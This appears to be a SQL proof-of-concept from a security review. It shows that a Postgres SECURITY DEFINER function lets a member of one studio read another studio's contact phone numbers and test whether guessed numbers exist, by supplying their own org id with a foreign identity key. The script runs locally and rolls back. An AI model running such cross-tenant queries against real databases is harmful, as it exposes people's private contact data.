-- ═══════════════════════════════════════════════════════════════════════════
-- probe105 — W1b final review r5, BLOCKING-1
-- identity_phone_numbers() (00626:535-560) is SECURITY DEFINER and gated on
-- is_active_studio_member(p_organization_id) ONLY. Both p_organization_id and
-- p_identity_key are CALLER-SUPPLIED, so the gate proves membership of the org
-- the caller NAMES, never of the studio the seats belong to. The seat leg of
-- the UNION scans public.project_parties with NO organization predicate.
-- Local Postgres only. Every act is rolled back.
-- ═══════════════════════════════════════════════════════════════════════════
\pset pager off
BEGIN;

-- A Local Dev Studio seat keyed on a LOGIN, carrying a number. Written as
-- postgres: it stands for an ordinary seat the victim studio already holds.
INSERT INTO public.project_parties
  (id, project_id, party_kind, display_name, phone_e164, profile_id, studio_contact_id)
VALUES ('aaaa0000-0000-4000-8000-0000000000a1','d0e00000-0000-0000-0000-00000000000a',
        'sub','Victim Trade','+16125559871','a0000000-0000-0000-0000-000000000003',NULL);

-- Act as the OWNER OF A DIFFERENT STUDIO (Phase One Synthetic Studio).
SET LOCAL ROLE authenticated;
SET LOCAL "request.jwt.claims" = '{"sub":"cf100000-0000-4000-8000-000000000001","role":"authenticated"}';

\echo '=== who I am ==='
SELECT current_setting('request.jwt.claims',true)::jsonb->>'sub' AS acting_as,
       public.is_active_studio_member('cf120000-0000-4000-8000-000000000001') AS member_of_my_own_studio,
       public.is_active_studio_member('b0000000-0000-0000-0000-000000000001') AS member_of_the_victim_studio;

\echo '=== what RLS lets me see of the victim studio ==='
SELECT count(*) AS victim_seats_visible FROM public.project_parties
 WHERE id='aaaa0000-0000-4000-8000-0000000000a1';
SELECT count(*) AS victim_cards_visible FROM public.studio_contacts
 WHERE id IN ('d0e10000-0000-0000-0000-000000000004','d0e10000-0000-0000-0000-000000000016');
SELECT count(*) AS victim_directory_rows FROM public.people_directory;
SELECT count(*) AS victim_seat_rows      FROM public.people_directory_seats;

\echo '=== THE LEAK: my own org id + a FOREIGN identity key (a login) ==='
SELECT * FROM public.identity_phone_numbers(
  'cf120000-0000-4000-8000-000000000001',
  'a0000000-0000-0000-0000-000000000003', NULL);

\echo '=== THE LEAK: my own org id + a FOREIGN rolodex card uuid ==='
SELECT 'Adaeze Okonkwo card' AS which, n.v FROM public.identity_phone_numbers(
    'cf120000-0000-4000-8000-000000000001','d0e10000-0000-0000-0000-000000000004', NULL) AS n(v)
UNION ALL
SELECT 'Amara Osei card', n.v FROM public.identity_phone_numbers(
    'cf120000-0000-4000-8000-000000000001','d0e10000-0000-0000-0000-000000000016', NULL) AS n(v);

\echo '=== the existence oracle on a guessed number ==='
SELECT 'a number seated in the victim studio (+16125550219)' AS probe, count(*) AS hits
  FROM public.identity_phone_numbers('cf120000-0000-4000-8000-000000000001','+16125550219',NULL)
UNION ALL
SELECT 'a number seated nowhere (+19995550000)', count(*)
  FROM public.identity_phone_numbers('cf120000-0000-4000-8000-000000000001','+19995550000',NULL);

\echo '=== the CONTROL the r4 round ran, which passes: the victim org id refuses ==='
SELECT count(*) AS numbers_when_I_name_the_victim_org
  FROM public.identity_phone_numbers('b0000000-0000-0000-0000-000000000001','+16125550219',NULL);

\echo '=== and the consent WORD does not leak (verdicts resolve at p_organization_id) ==='
SELECT public.identity_consent_status('cf120000-0000-4000-8000-000000000001',
         'd0e10000-0000-0000-0000-000000000016', NULL) AS consent_word_at_my_own_org;

ROLLBACK;
